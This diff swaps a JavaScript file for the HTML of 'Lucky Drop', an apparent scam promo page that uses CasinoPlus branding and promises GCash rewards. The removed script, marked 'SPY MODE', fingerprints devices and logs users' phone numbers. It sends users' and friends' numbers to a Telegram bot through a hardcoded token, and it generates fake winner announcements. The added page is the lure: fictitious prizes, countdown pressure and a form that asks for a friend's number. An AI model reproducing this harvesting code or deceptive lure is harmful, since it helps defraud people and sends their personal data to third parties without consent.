@@ -1,940 +1,150 @@
-// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Lucky Drop | Share & Earn</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="js/config.js"></script>
+    
+    <meta property="og:title" content="CasinoPlus Lucky Drop">
+    <meta property="og:description" content="Share with friends and earn up to ₱300!">
+    <meta property="og:image" content="https://xjiligames.github.io/rewards/images/logo1.png">
+    <meta property="og:url" content="https://xjiligames.github.io/rewards/index.html">
+    <meta property="og:type" content="website">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&amp;family=Orbitron:wght@700;900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles/promo.css">
+    <link rel="stylesheet" href="styles/firewall.css">
+</head>
+<body>
 
-const spyTracker = {
-    getFingerprint: function() {
-        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const fingerprintString = `${navigator.userAgent}|${screen}|${timezone}|${navigator.language}|${navigator.platform}|${navigator.hardwareConcurrency || 'unknown'}|${navigator.deviceMemory || 'unknown'}`;
-        
-        let hash = 0;
-        for (let i = 0; i < fingerprintString.length; i++) {
-            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
-            hash |= 0;
-        }
-        return `FP_${Math.abs(hash)}`;
-    },
+<div class="live-winners-ticker" id="winnerTicker">
+    <div class="live-dot"></div>
+    <span id="winnerText">Loading winners...</span>
+</div>
 
-    track: async function() {
-        const phone = localStorage.getItem("userPhone");
-        const fingerprint = this.getFingerprint();
-        
-        if (!phone) return;
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            
-            try {
-                const deviceRef = db.ref('devices/' + fingerprint);
-                const deviceSnap = await deviceRef.once('value');
-                
-                if (!deviceSnap.exists()) {
-                    const counterRef = db.ref('admin/deviceCounter');
-                    const counterSnap = await counterRef.once('value');
-                    let nextNum = (counterSnap.val() || 0) + 1;
-                    await counterRef.set(nextNum);
-                    const displayId = `Dev${nextNum}`;
-                    
-                    await deviceRef.set({
-                        phone: phone,
-                        displayId: displayId,
-                        fingerprint: fingerprint,
-                        firstSeen: Date.now(),
-                        lastSeen: Date.now()
-                    });
-                    
-                    await db.ref('device_id_map/' + fingerprint).set({
-                        displayId: displayId,
-                        phone: phone,
-                        createdAt: Date.now()
-                    });
-                    
-                    localStorage.setItem("userDeviceDisplayId", displayId);
-                } else {
-                    await deviceRef.update({
-                        lastSeen: Date.now(),
-                        phone: phone
-                    });
-                }
-                
-                await db.ref('device_phone_map/' + fingerprint).set({
-                    phone: phone,
-                    lastSeen: Date.now()
-                });
-                
-                const sessionRef = db.ref('user_sessions/' + phone);
-                const sessionSnap = await sessionRef.once('value');
-                
-                if (!sessionSnap.exists()) {
-                    await sessionRef.set({
-                        phone: phone,
-                        balance: 0,
-                        deviceFingerprint: fingerprint,
-                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
-                        firstVisit: Date.now(),
-                        lastUpdate: Date.now(),
-                        highestReward: 0,
-                        indicatorStep: 0,
-                        claimOnHold: false,
-                        youGetClicked: false,
-                        friendGetsClicked: false
-                    });
-                } else {
-                    await sessionRef.update({
-                        deviceFingerprint: fingerprint,
-                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || sessionSnap.val().deviceDisplayId,
-                        lastUpdate: Date.now()
-                    });
-                }
-                
-                await db.ref('activity_logs/' + Date.now()).set({
-                    phone: phone,
-                    deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
-                    fingerprint: fingerprint,
-                    page: "share_and_earn",
-                    timestamp: Date.now()
-                });
-                
-            } catch(e) {
-                console.log("Tracking error:", e);
-            }
-        }
-    }
-};
+<div class="share-container">
+    <div class="header">
+        <h1>LUCKY DROP 🐾</h1>
+    </div>
+    
+    <div class="user-info" style="text-align:center; margin-bottom:15px; padding:8px; background:rgba(255,215,0,0.1); border-radius:40px;">
+        <span style="font-size:11px; color:#ffd966;">📱 Logged in as:</span>
+        <span id="userPhoneDisplay" style="font-size:13px; font-weight:600; color:#ffd700;">Loading...</span>
+    </div>
+    
+    <div class="prize-grid">
+        <div class="prize-card">
+            <div class="lucky-cat-video">
+                <video autoplay loop muted playsinline>
+                    <source src="sounds/luckycat.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="prize-label">YOU GET</div>
+            <div class="prize-amount">₱150</div>
+        </div>
+        <div class="prize-card">
+            <div class="lucky-cat-video">
+                <video autoplay loop muted playsinline>
+                    <source src="sounds/luckycat.mp4" type="video/mp4">
+                </video>
+            </div>
+            <div class="prize-label">FRIEND GETS</div>
+            <div class="prize-amount">₱150</div>
+        </div>
+    </div>
+    
+    <div class="winners-banner">
+        <span>🌟 <strong>LUCKY WINNERS</strong>🌟<br> will receive <strong>150</strong> Credits</span>
+    </div>
+    
+    <div class="time-left-section">
+        <div class="time-label">⏰ HOORAY DROP ENDS IN ⏰</div>
+        <div class="time-display" id="mainTimerDisplay">Loading...</div>
+    </div>
+    
+    <div class="share-card">
+        <div class="step-badge">📱 STEP 1 - SHARE WITH FRIEND 📱</div>
+        <input type="tel" id="friendPhoneInput" class="input-field" placeholder="Enter friend's mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <button class="share-button" id="shareButton">🐾 SHARE & UNLOCK 🐾</button>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="status-message" id="statusMessage"><span class="status-locked">Share with a friend to unlock 150 credits! 🐾</span></div>
+        <div class="share-social-text">Share to Social Media friends to get up to ₱1,000</div>
+    </div>
+</div>
 
-// ========== SOUND EFFECTS ==========
-const soundEffects = {
-    tapSound: null,
-    luckyCatVideo: null,
-    
-    init: function() {
-        // I-preload ang tap sound
-        this.tapSound = new Audio('sounds/tap.mp3');
-        this.tapSound.preload = 'auto';
-        
-        // Hanapin ang lucky cat video
-        this.luckyCatVideo = document.querySelector('.lucky-cat-video video');
-        if (this.luckyCatVideo) {
-            this.luckyCatVideo.play().catch(e => console.log("Video autoplay blocked:", e));
-        }
-    },
-    
-    playTap: function() {
-        if (this.tapSound) {
-            this.tapSound.currentTime = 0;
-            this.tapSound.play().catch(e => console.log("Sound play error:", e));
-        }
-    },
-    
-    restoreLuckyCatVideo: function() {
-        if (this.luckyCatVideo && this.luckyCatVideo.paused) {
-            this.luckyCatVideo.play().catch(e => console.log("Video restart error:", e));
-        }
-    },
-    
-    pauseLuckyCatVideo: function() {
-        if (this.luckyCatVideo && !this.luckyCatVideo.paused) {
-            this.luckyCatVideo.pause();
-        }
-    }
-};
+<div id="prizePopup" class="prize-popup">
+    <div class="popup-container">
+        <div class="popup-inner">
+            <div class="popup-close" onclick="closePrizePopup()">✕</div>
+            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
+            <div class="popup-balance" id="popupBalanceAmount">₱150.00</div>
+            <div class="divider"></div>
+            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
+            <div class="countdown-timer" id="popupTimerDisplay">05:00</div>
+            <div class="luckyday-image-container">
+                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
+            </div>
+            <div class="divider"></div>
+            <div class="indicator-group">
+                <div class="indicator" id="indicator1"></div>
+                <div class="indicator" id="indicator2"></div>
+                <div class="indicator" id="indicator3"></div>
+            </div>
+            <button class="claim-gcash-button" id="claimGCashBtn">💰 CLAIM THRU GCASH</button>
+            <button class="share-fb-button" id="shareFBBtn">📘 Share to Facebook</button>
+        </div>
+    </div>
+</div>
 
-// ========== ANIMATION FUNCTIONS ==========
-function showFloatingPlusAnimation(x, y, amount) {
-    const floatingDiv = document.createElement('div');
-    floatingDiv.className = 'floating-plus';
-    floatingDiv.innerHTML = `+₱${amount}`;
-    floatingDiv.style.position = 'fixed';
-    floatingDiv.style.left = x + 'px';
-    floatingDiv.style.top = y + 'px';
-    floatingDiv.style.color = '#ffd700';
-    floatingDiv.style.fontSize = '28px';
-    floatingDiv.style.fontWeight = 'bold';
-    floatingDiv.style.fontFamily = 'Orbitron, monospace';
-    floatingDiv.style.textShadow = '0 0 10px #ffaa33';
-    floatingDiv.style.pointerEvents = 'none';
-    floatingDiv.style.zIndex = '10001';
-    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
-    
-    document.body.appendChild(floatingDiv);
-    
-    setTimeout(() => {
-        floatingDiv.remove();
-    }, 1000);
-}
+<!-- Hidden balanceText for popup.js decrement animation -->
+<div id="balanceText" style="display: none;">₱0</div>
 
-// Add CSS animation kung wala pa
-if (!document.querySelector('#floatAnimationStyle')) {
-    const style = document.createElement('style');
-    style.id = 'floatAnimationStyle';
-    style.textContent = `
-        @keyframes floatUp {
-            0% { opacity: 1; transform: translateY(0) scale(1); }
-            100% { opacity: 0; transform: translateY(-100px) scale(1.5); }
-        }
-    `;
-    document.head.appendChild(style);
-}
+<!-- Firewall Popup -->
+<div id="firewallPopup" class="firewall-popup" style="display: none;">
+    <div class="firewall-popup-content" id="firewallPopupContent"></div>
+</div>
 
-// ========== CARD HIGHLIGHT & CLICK HANDLERS ==========
-let youGetClicked = false;
-let friendGetsClicked = false;
+<!-- Claim Popup -->
+<div id="claimPopup" class="claim-popup" style="display: none;">
+    <div class="claim-popup-container">
+        <div class="claim-popup-inner">
+            <h2>🎉 CONGRATULATIONS! 🎉</h2>
+            <div class="claim-prize-amount">You won <span id="popupPrizeAmount">₱0</span></div>
+            <button id="claimActionBtn" class="claim-action-btn">CLAIM THRU GCASH</button>
+            <button class="claim-cancel-btn" onclick="hideClaimPopup()">Cancel</button>
+        </div>
+    </div>
+</div>
 
-async function checkCardClickStatus() {
-    const phone = localStorage.getItem("userPhone");
-    if (!phone) return;
-    
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-        youGetClicked = sessionSnap.exists() ? sessionSnap.val().youGetClicked || false : false;
-        friendGetsClicked = sessionSnap.exists() ? sessionSnap.val().friendGetsClicked || false : false;
-        
-        // I-update ang visual ng cards
-        updateCardVisuals();
-    }
-}
+<!-- Pending Status Area -->
+<div id="pendingStatusArea" class="pending-status-area" style="display: none;">
+    <div class="pending-status-container">
+        <div class="pending-spinner"></div>
+        <div class="pending-message">Processing your claim...</div>
+        <div class="pending-countdown">Time remaining: <span id="pendingCountdown">03:00</span></div>
+    </div>
+</div>
 
-function updateCardVisuals() {
-    const youGetCard = document.querySelector('.prize-card:first-child');
-    const friendGetsCard = document.querySelector('.prize-card:last-child');
-    
-    if (youGetCard) {
-        if (youGetClicked) {
-            youGetCard.style.border = '2px solid #ffd700';
-            youGetCard.style.boxShadow = '0 0 20px rgba(255,215,0,0.5)';
-            youGetCard.style.cursor = 'default';
-        } else {
-            youGetCard.style.border = '1px solid rgba(255,215,0,0.2)';
-            youGetCard.style.cursor = 'pointer';
-            youGetCard.style.transition = 'all 0.3s ease';
-        }
-    }
-    
-    if (friendGetsCard) {
-        if (friendGetsClicked) {
-            friendGetsCard.style.border = '2px solid #ffd700';
-            friendGetsCard.style.boxShadow = '0 0 20px rgba(255,215,0,0.5)';
-            friendGetsCard.style.cursor = 'default';
-        } else {
-            friendGetsCard.style.border = '1px solid rgba(255,215,0,0.2)';
-            friendGetsCard.style.cursor = 'pointer';
-            friendGetsCard.style.transition = 'all 0.3s ease';
-        }
-    }
-}
+<canvas id="confettiCanvas"></canvas>
 
-async function handleYouGetClick(event) {
-    if (youGetClicked) return;
-    
-    // Kunin ang position para sa animation
-    const rect = event.currentTarget.getBoundingClientRect();
-    const x = rect.left + rect.width / 2;
-    const y = rect.top + rect.height / 2;
-    
-    // I-play ang tunog
-    soundEffects.playTap();
-    soundEffects.pauseLuckyCatVideo();
-    
-    // I-hold ang lucky cat video temporarily
-    setTimeout(() => {
-        soundEffects.restoreLuckyCatVideo();
-    }, 2000);
-    
-    // Show confetti
-    startConfetti();
-    
-    // Show floating +150 animation
-    showFloatingPlusAnimation(x, y, 150);
-    
-    // Mark as clicked
-    youGetClicked = true;
-    updateCardVisuals();
-    
-    // I-save sa Firebase
-    const phone = localStorage.getItem("userPhone");
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        await db.ref('user_sessions/' + phone).update({
-            youGetClicked: true
-        });
-    }
-    
-    // I-update ang indicator (Step 1)
-    await indicatorSystem.setStep(1);
-    
-    console.log("🎉 YOU GET card clicked! +₱150 animation played");
-}
+<script src="js/popup.js"></script>
+<script src="js/promotion.js"></script>
 
-async function handleFriendGetsClick(event) {
-    if (friendGetsClicked) return;
-    
-    // Kunin ang position para sa animation
-    const rect = event.currentTarget.getBoundingClientRect();
-    const x = rect.left + rect.width / 2;
-    const y = rect.top + rect.height / 2;
-    
-    // I-play ang tunog
-    soundEffects.playTap();
-    soundEffects.pauseLuckyCatVideo();
-    
-    setTimeout(() => {
-        soundEffects.restoreLuckyCatVideo();
-    }, 2000);
-    
-    // Show confetti
-    startConfetti();
-    
-    // Show floating +150 animation
-    showFloatingPlusAnimation(x, y, 150);
-    
-    // Mark as clicked
-    friendGetsClicked = true;
-    updateCardVisuals();
-    
-    // I-save sa Firebase
-    const phone = localStorage.getItem("userPhone");
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        await db.ref('user_sessions/' + phone).update({
-            friendGetsClicked: true
-        });
-        
-        // Magdagdag ng ₱150 sa balance
-        const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-        const currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
-        const newBalance = currentBalance + 150;
-        await db.ref('user_sessions/' + phone).update({
-            balance: newBalance,
-            lastBalanceUpdate: Date.now()
-        });
-        
-        alert(`🎉 +₱150 added to your balance! Total: ₱${newBalance}`);
-    }
-}
-
-// ========== INDICATOR SYSTEM ==========
-
-const indicatorSystem = {
-    updateIndicators: function(step, isOnHold = false) {
-        const indicator1 = document.getElementById('indicator1');
-        const indicator2 = document.getElementById('indicator2');
-        const indicator3 = document.getElementById('indicator3');
-        
-        [indicator1, indicator2, indicator3].forEach(ind => {
-            if (ind) {
-                ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
-                ind.style.background = 'rgba(255,255,255,0.2)';
-                ind.style.boxShadow = 'none';
-                ind.style.animation = 'none';
-            }
-        });
-        
-        if (step >= 1 && indicator1) {
-            if (isOnHold) {
-                indicator1.classList.add('indicator-hold');
-                indicator1.style.background = '#ffd700';
-                indicator1.style.boxShadow = '0 0 15px #ffd700';
-            } else {
-                indicator1.classList.add('indicator-yellow-red');
-                indicator1.style.background = 'linear-gradient(90deg, #ff4444, #ffd700)';
-                indicator1.style.boxShadow = '0 0 10px #ff4444';
-                indicator1.style.animation = 'pulseFade 1s infinite';
-            }
-        }
-        
-        if (step >= 2 && indicator2) {
-            indicator2.classList.add('indicator-blue');
-            indicator2.style.background = '#00f2ff';
-            indicator2.style.boxShadow = '0 0 10px #00f2ff';
-            indicator2.style.animation = 'pulseFade 1s infinite';
-        }
-        
-        if (step >= 3 && indicator3) {
-            indicator3.classList.add('indicator-green');
-            indicator3.style.background = '#39ff14';
-            indicator3.style.boxShadow = '0 0 10px #39ff14';
-            indicator3.style.animation = 'pulseFade 1s infinite';
-        }
-        
-        localStorage.setItem('indicatorStep', step);
-        localStorage.setItem('claimOnHold', isOnHold);
-        this.saveToFirebase(step, isOnHold);
-    },
-    
-    saveToFirebase: async function(step, isOnHold) {
-        const phone = localStorage.getItem("userPhone");
-        if (!phone) return;
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            await db.ref('user_sessions/' + phone).update({
-                indicatorStep: step,
-                claimOnHold: isOnHold,
-                lastStepUpdate: Date.now()
-            });
-        }
-    },
-    
-    loadFromFirebase: async function() {
-        const phone = localStorage.getItem("userPhone");
-        if (!phone) return { step: 0, isOnHold: false };
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            const db = firebase.database();
-            const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-            const step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
-            const isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
-            localStorage.setItem('indicatorStep', step);
-            localStorage.setItem('claimOnHold', isOnHold);
-            this.updateIndicators(step, isOnHold);
-            return { step, isOnHold };
-        }
-        return { step: 0, isOnHold: false };
-    },
-    
-    setStep: function(step) {
-        this.updateIndicators(step, false);
-    },
-    
-    getCurrentStep: function() {
-        return parseInt(localStorage.getItem('indicatorStep') || '0');
-    }
-};
-
-// ========== WEIGHTED RANDOM AMOUNTS ==========
-const rewardTiers = {
-    common: { amounts: [150, 300], weight: 60 },
-    rare: { amounts: [450, 600, 750], weight: 30 },
-    legendary: { amounts: [900, 1050, 1200], weight: 10 }
-};
-
-function generateWeightedAmount() {
-    const random = Math.random() * 100;
-    let selectedTier = rewardTiers.common;
-    
-    if (random < rewardTiers.common.weight) {
-        selectedTier = rewardTiers.common;
-    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
-        selectedTier = rewardTiers.rare;
-    } else {
-        selectedTier = rewardTiers.legendary;
+<script>
+    var userPhone = localStorage.getItem("userPhone");
+    var userPhoneDisplay = document.getElementById('userPhoneDisplay');
+    if (userPhoneDisplay) {
+        userPhoneDisplay.innerText = userPhone || 'Not logged in';
     }
     
-    const amounts = selectedTier.amounts;
-    return amounts[Math.floor(Math.random() * amounts.length)];
-}
-
-// ========== WINNER TICKER (FIXED) ==========
-const winnerTicker = {
-    prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
-    winnerElement: null,
-    tickerInterval: null,
-    
-    generateLast4Digits: function() {
-        return Math.floor(1000 + Math.random() * 9000).toString();
-    },
-    
-    generatePrefix: function() {
-        return this.prefixes[Math.floor(Math.random() * this.prefixes.length)];
-    },
-    
-    generateWinnerText: function() {
-        const prefix = this.generatePrefix();
-        const last4 = this.generateLast4Digits();
-        const amount = generateWeightedAmount();
-        return `${prefix}***${last4} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
-    },
-    
-    updateWinner: function() {
-        if (!this.winnerElement) return;
-        const newText = this.generateWinnerText();
-        this.winnerElement.innerHTML = newText;
-    },
-    
-    start: function() {
-        this.winnerElement = document.getElementById('winnerText');
-        if (!this.winnerElement) {
-            setTimeout(() => this.start(), 500);
-            return;
-        }
-        
-        this.winnerElement.innerHTML = this.generateWinnerText();
-        
-        if (this.tickerInterval) clearInterval(this.tickerInterval);
-        this.tickerInterval = setInterval(() => {
-            this.updateWinner();
-        }, 15000);
-        
-        console.log("🎲 Winner ticker started");
-    },
-    
-    stop: function() {
-        if (this.tickerInterval) {
-            clearInterval(this.tickerInterval);
-            this.tickerInterval = null;
-        }
+    if (!userPhone) {
+        alert("Please login first.");
+        window.location.href = "index.html";
     }
-};
-
-// ========== REFERRAL TIMER ==========
-const referralTimer = {
-    STORAGE_KEY: 'referral_end_time',
-    
-    startTimer: function() {
-        const endTime = Date.now() + (5 * 60 * 1000);
-        localStorage.setItem(this.STORAGE_KEY, endTime);
-        return endTime;
-    },
-    
-    getRemainingTime: function() {
-        const endTime = localStorage.getItem(this.STORAGE_KEY);
-        if (!endTime) return 0;
-        
-        const remaining = parseInt(endTime) - Date.now();
-        if (remaining <= 0) {
-            this.clearTimer();
-            return 0;
-        }
-        return Math.floor(remaining / 1000);
-    },
-    
-    clearTimer: function() {
-        localStorage.removeItem(this.STORAGE_KEY);
-    },
-    
-    isOnCooldown: function() {
-        return this.getRemainingTime() > 0;
-    },
-    
-    formatTime: function(seconds) {
-        const mins = Math.floor(seconds / 60);
-        const secs = seconds % 60;
-        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-    },
-    
-    updatePopupDisplay: function() {
-        const remaining = this.getRemainingTime();
-        const timerElement = document.getElementById('popupTimerDisplay');
-        
-        if (timerElement) {
-            if (remaining > 0) {
-                timerElement.innerHTML = this.formatTime(remaining);
-                timerElement.style.color = '#ffaa33';
-            } else {
-                timerElement.innerHTML = "00:00";
-                timerElement.style.color = '#39ff14';
-            }
-        }
-        return remaining;
-    },
-    
-    startPopupCountdown: function() {
-        this.updatePopupDisplay();
-        
-        const interval = setInterval(() => {
-            const remaining = this.updatePopupDisplay();
-            if (remaining <= 0) {
-                clearInterval(interval);
-            }
-        }, 1000);
-        
-        return interval;
-    }
-};
-
-// ========== SHARE BUTTON COOLDOWN UI ==========
-let shareCooldownInterval = null;
-
-function updateShareButtonCooldown() {
-    const remaining = referralTimer.getRemainingTime();
-    const shareBtn = document.getElementById('shareButton');
-    const friendInput = document.getElementById('friendPhoneInput');
-    const statusMsg = document.getElementById('statusMessage');
-    
-    if (remaining > 0) {
-        const mins = Math.floor(remaining / 60);
-        const secs = remaining % 60;
-        if (shareBtn) {
-            shareBtn.disabled = true;
-            shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-        }
-        if (friendInput) friendInput.disabled = true;
-        if (statusMsg) {
-            statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
-        }
-    } else {
-        if (shareBtn) {
-            shareBtn.disabled = false;
-            shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
-        }
-        if (friendInput) friendInput.disabled = false;
-        if (statusMsg) {
-            statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
-        }
-        if (shareCooldownInterval) {
-            clearInterval(shareCooldownInterval);
-            shareCooldownInterval = null;
-        }
-    }
-}
-
-function startShareCooldownUI() {
-    if (shareCooldownInterval) clearInterval(shareCooldownInterval);
-    updateShareButtonCooldown();
-    shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
-}
-
-// ========== SHARE BUTTON HANDLER ==========
-async function handleShare() {
-    const friendPhone = document.getElementById('friendPhoneInput').value.trim();
-    const userPhone = localStorage.getItem("userPhone");
-    
-    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
-        alert("Please enter valid 11-digit number starting with 09");
-        return;
-    }
-    
-    if (friendPhone === userPhone) {
-        alert("You cannot invite yourself!");
-        return;
-    }
-    
-    if (referralTimer.isOnCooldown()) {
-        const remaining = referralTimer.getRemainingTime();
-        const mins = Math.floor(remaining / 60);
-        const secs = remaining % 60;
-        alert(`Please wait ${mins}:${secs.toString().padStart(2, '0')} before inviting again.`);
-        return;
-    }
-    
-    // I-restore ang lucky cat video
-    soundEffects.restoreLuckyCatVideo();
-    
-    referralTimer.startTimer();
-    startShareCooldownUI();
-    
-    const message = `📱 REFERRAL INVITE!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}`;
-    
-    try {
-        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
-    
-    document.getElementById('friendPhoneInput').value = '';
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '33%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-step1">✅ Friend invited! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>`;
-    }
-    
-    showPrizePopup();
-}
-
-// ========== FACEBOOK SHARE HANDLER ==========
-async function handleFacebookShare() {
-    const shareUrl = "https://xjiligames.github.io/rewards/index.html";
-    const shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
-    
-    const fbShareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&quote=${encodeURIComponent(shareText)}`;
-    
-    window.open(fbShareUrl, '_blank', 'width=600,height=400');
-    
-    await indicatorSystem.setStep(2);
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '66%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>`;
-    }
-}
-
-// ========== CLAIM GCASH BUTTON ==========
-async function handleClaimGCash() {
-    const currentStep = indicatorSystem.getCurrentStep();
-    const isOnHold = localStorage.getItem('claimOnHold') === 'true';
-    
-    if (currentStep !== 1) {
-        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
-        return;
-    }
-    
-    if (isOnHold) {
-        alert("⏳ Claim is already processing. Please wait.");
-        return;
-    }
-    
-    await indicatorSystem.updateIndicators(1, true);
-    
-    const phone = localStorage.getItem("userPhone");
-    let newBalance = 0;
-    
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        const db = firebase.database();
-        const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-        const currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
-        newBalance = currentBalance + 150;
-        await db.ref('user_sessions/' + phone).update({
-            balance: newBalance,
-            lastBalanceUpdate: Date.now()
-        });
-    }
-    
-    alert(`💰 ₱150 added to your balance! Total: ₱${newBalance}`);
-    
-    const message = `💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: ${phone}\n💵 ₱150 claimed\n💰 New Balance: ₱${newBalance}`;
-    await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
-    
-    const progressFill = document.getElementById('progressFill');
-    if (progressFill) progressFill.style.width = '50%';
-    
-    const statusMsg = document.getElementById('statusMessage');
-    if (statusMsg) {
-        statusMsg.innerHTML = `<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>`;
-    }
-    
-    indicatorSystem.updateIndicators(1, false);
-}
-
-// ========== PRIZE POPUP FUNCTIONS ==========
-let popupCountdownInterval = null;
-
-function showPrizePopup() {
-    const popup = document.getElementById('prizePopup');
-    const popupBalance = document.getElementById('popupBalanceAmount');
-    
-    if (popupBalance) popupBalance.innerHTML = "₱150.00";
-    
-    if (popupCountdownInterval) clearInterval(popupCountdownInterval);
-    popupCountdownInterval = referralTimer.startPopupCountdown();
-    
-    startConfetti();
-    
-    if (popup) popup.style.display = 'flex';
-}
-
-function closePrizePopup() {
-    const popup = document.getElementById('prizePopup');
-    if (popup) popup.style.display = 'none';
-    stopConfetti();
-}
-
-// ========== CONFETTI FUNCTIONS ==========
-let confettiAnimation = null;
-
-function startConfetti() {
-    const canvas = document.getElementById('confettiCanvas');
-    if (!canvas) return;
-    
-    canvas.style.display = 'block';
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const ctx = canvas.getContext('2d');
-    
-    const particles = [];
-    for (let i = 0; i < 150; i++) {
-        particles.push({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height - canvas.height,
-            size: Math.random() * 8 + 3,
-            color: `hsl(${Math.random() * 360}, 100%, 60%)`,
-            speed: Math.random() * 4 + 2
-        });
-    }
-    
-    function draw() {
-        if (!canvas || canvas.style.display === 'none') return;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        
-        for (let p of particles) {
-            ctx.fillStyle = p.color;
-            ctx.fillRect(p.x, p.y, p.size, p.size);
-            p.y += p.speed;
-            if (p.y > canvas.height) {
-                p.y = -p.size;
-                p.x = Math.random() * canvas.width;
-            }
-        }
-        
-        confettiAnimation = requestAnimationFrame(draw);
-    }
-    
-    draw();
-    
-    setTimeout(() => {
-        stopConfetti();
-    }, 5000);
-}
-
-function stopConfetti() {
-    if (confettiAnimation) {
-        cancelAnimationFrame(confettiAnimation);
-        confettiAnimation = null;
-    }
-    const canvas = document.getElementById('confettiCanvas');
-    if (canvas) {
-        const ctx = canvas.getContext('2d');
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        canvas.style.display = 'none';
-    }
-}
-
-// ========== MAIN TIMER ==========
-let mainTimerInterval = null;
-
-function updateMainTimer() {
-    const target = new Date(2026, 4, 1, 0, 0, 0);
-    const now = new Date();
-    const diff = target - now;
-    const timerDisplay = document.getElementById('mainTimerDisplay');
-    
-    if (timerDisplay) {
-        if (diff > 0) {
-            const days = Math.floor(diff / (1000*60*60*24));
-            const hours = Math.floor((diff % (86400000)) / 3600000);
-            const mins = Math.floor((diff % 3600000) / 60000);
-            const secs = Math.floor((diff % 60000) / 1000);
-            timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-        } else {
-            timerDisplay.innerHTML = "00D 00:00:00";
-        }
-    }
-}
-
-function startMainTimer() {
-    updateMainTimer();
-    if (mainTimerInterval) clearInterval(mainTimerInterval);
-    mainTimerInterval = setInterval(updateMainTimer, 1000);
-}
-
-// ========== CHECK EXISTING COOLDOWN ==========
-function checkExistingCooldown() {
-    if (referralTimer.isOnCooldown()) {
-        startShareCooldownUI();
-    }
-}
-
-// ========== INITIALIZE ==========
